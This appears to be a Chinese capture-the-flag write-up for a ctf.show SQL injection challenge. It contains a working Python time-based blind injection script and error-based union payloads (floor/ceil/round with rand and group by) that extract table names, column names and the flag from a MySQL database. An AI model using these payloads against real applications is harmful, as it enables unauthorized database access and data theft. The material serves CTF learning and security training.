# 知识点
### 其他一些报错注入
> 1.floor()、round()、ceil()
> 
> 2.exp() //5.5.5版本之后可以使用
> 
> 3.name_const 
> 
> 4.geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring() 几何函数报错


# 思路
### 方法一
三种盲注都被过滤，我选择延时盲注（dog
```plsql
import requests
import time
url = 'http://fa420279-0c5b-4832-8602-22a3c9be3158.challenge.ctf.show/api/?id='
str = ''
for i in range(1, 60):
    min,max = 32, 128
    while True:
        j = min + (max-min)//2
        if(min == j):
            str += chr(j)
            print(str)
            break
        # 爆表名
        # payload = f"1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))<{j},sleep(0.5),1)%23"

        # 爆列
        # payload = f"1' and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagsa'),{i},1))<{j},sleep(0.5),1)%23"

        # 爆值
        payload = f"1' and if(ascii(substr((select group_concat(`flag?`) from ctfshow_flagsa),{i},1))<{j},sleep(0.6),1)%23"

        start_time = time.time()
        r = requests.get(url=url+payload).text
        end_time = time.time()
        sub = end_time - start_time
        if sub >= 0.5:
            max = j
        else:
            min = j

```
### 方法二 将floor换成round或者ceil
> Mysql取整函数
> 1.round
> 四舍五入取整
> round(s,n)：对s四舍五入保留n位小数,n取值可为正、负、零.
> 如四舍五入到整数位，则n取零.
> 2.ceil
> 向上取整
> ceil(s)：返回比s大的最小整数
> 3.floor
> 向下取整
> floor(s)：返回比s小的最大整数
> 直接把上一步的floor替换成ceil或者round即可。
> 有一点需要注意下，列名查出来是flag?，所以我们在查数据的时候要包个反引号


```plsql
查表 
1' union select 1,count(*),concat(0x3a,0x3a,(select (table_name) from information_schema.tables where table_schema=database()  limit 1,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23
查列 
1' union select 1,count(*),concat(0x3a,0x3a,(select (column_name) from information_schema.columns where table_name='ctfshow_flagsa'  limit 1,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23
查数据 
1' union select 1,count(*),concat(0x3a,0x3a,(select (`flag?`) from ctfshow_flagsa  limit 0,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23
```

